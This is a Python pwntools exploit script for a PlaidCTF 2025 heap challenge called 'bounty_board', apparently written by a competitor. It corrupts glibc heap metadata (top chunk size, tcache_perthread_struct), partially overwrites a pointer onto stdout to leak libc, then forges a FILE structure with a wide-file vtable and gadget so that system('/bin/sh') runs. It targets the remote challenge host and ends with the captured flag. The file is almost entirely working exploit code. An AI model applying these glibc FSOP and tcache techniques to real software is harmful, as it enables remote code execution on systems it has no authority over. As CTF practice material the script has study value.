#!/usr/bin/python3
from pwn import *
from sys import argv
import traceback

# remote uses __memcpy_avx512_unaligned_erms

e = context.binary = ELF('./copy_patched')
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
if args.REMOTE:
    ip, port = "bounty-board.chal.pwni.ng", 1337
    conn = lambda: remote(ip, port, level="error")
else:
    conn = lambda: e.process(level="error")

context.terminal = ["gnome-terminal", "--", "bash", "-c"]

def attach(p):
    gdb.attach(p, gdbscript=f"""
        set $memcpy=__memcpy_avx512_unaligned_erms
        set $libc=(long)&system - 0x58750
        set $heap=*(unsigned long*)($libc-0x2900)-0x10
    """)
    pause()

send_choice = lambda c: p.sendlineafter(b"> ", str(c).encode())

index = 0
def alloc(size, data):
    global index
    send_choice(0)
    p.sendlineafter(b"size: ", str(size).encode())
    assert b"\n" not in data
    if len(data) < size:
        data += b"\n"
    p.send(data)
    index += 1
    return index-1

def copy(dst, src, sz):
    send_choice(1)
    p.sendlineafter(b"dst: ", str(dst).encode())
    p.sendlineafter(b"src: ", str(src).encode())
    p.sendlineafter(b"len: ", str(sz).encode())

def scanf(n):
    send_choice("0"*(n-1) + "1")
    p.sendlineafter(b"dst: ", b"-1")

def leak():
    # guess
    libc.address = 0xb000
    top_size = 0xc11

    data = b"A"*8 + p16(libc.sym._IO_2_1_stdout_ & 0xffff) + b"A"*6
    data += b"A" * 0x40
    data += b"A"*8 + p64(top_size)
    data = data.ljust(0x70, b"\x00")
    data += p16(0)*3 + p16(1) + p64(0)*4
    data = data.ljust(0xe0, b"\x00")

    src = alloc(0xf7, data)
    dst = alloc(0x57, b"B"*0x10)

    # overwrite top chunk size
    copy(dst, src, -0x190)

    # move tcache count into position
    copy(src, dst, -0x10)
    copy(src, dst, -0x90)
    copy(src, dst, -0x190)

    # copy guess back to src, it getts overwritten by last copy
    copy(dst, src, 0x10)

    # get unsortedbin chunk
    scanf(0x800)

    # copy libc pointer to another chunk
    leak1 = alloc(0x100, b"X")
    copy(src, leak1, -0x20)

    # partially overwrite libc pointer -> stdout
    copy(src, dst, 10)

    # move (guessed) stdout pointer to tcache_perthread_struct
    copy(src, dst, -0x78)
    copy(src, dst, -0x78-0x100+0x80)

    # allocate on stdout for FSOP
    alloc(0x47, p64(0xfbad1800) + b"\x00"*0x17)
    return p.recvuntil(b"[[ Menu ]]", drop=True)

def is_valid(p):
    p.recvuntil(b"[[ Menu ]]")
    return p.libs()["/home/sasha/CTF/plaid/2025/bounty_board/libc.so.6"] & 0xffff == 0xb000

while True:
    index = 0
    p = conn()
    try:
        out = leak()
        if out:
            break
        print("EMPTY")
    except EOFError as exception:
        print(repr(exception))
    p.close()

stdin = u64(out[-19-8:-19])
log.info(f"_IO_2_1_stdin_: {hex(stdin)}")

libc.address = 0
libc.address = stdin - libc.sym._IO_2_1_stdin_
log.info(f"libc: {hex(libc.address)}")

# setup 2 pointers in tcache_prethread_struct
# tcache[0xe0] and tcache[0xf0]
data  = p64(0)*2
data += p64(0) + p16(1)*2 + p16(0)*2
data = data.ljust(0xe0, b"\x00")
data += p64(0xdeadbeef) + p64(libc.sym._IO_2_1_stdout_)

dst = alloc(0xf7, data)
src = alloc(0xf7, data)

# move both tcache count and pointer into tcache_perthread_struct
for i in range(5):
    copy(dst, src, -(0x10 + 0x100*i))

# https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#3---the-fsop-way-targetting-stdout

# some constants
stdout_lock = libc.sym._IO_stdfile_1_lock
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x00000000001724f0 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

assert len(fake) <= 0xe8
alloc(0xe7, bytes(fake)[:0xe7])

p.interactive()
# PCTF{t4m1ng_7h3_wildc0py_in_th3_wi1d_wild_w3st}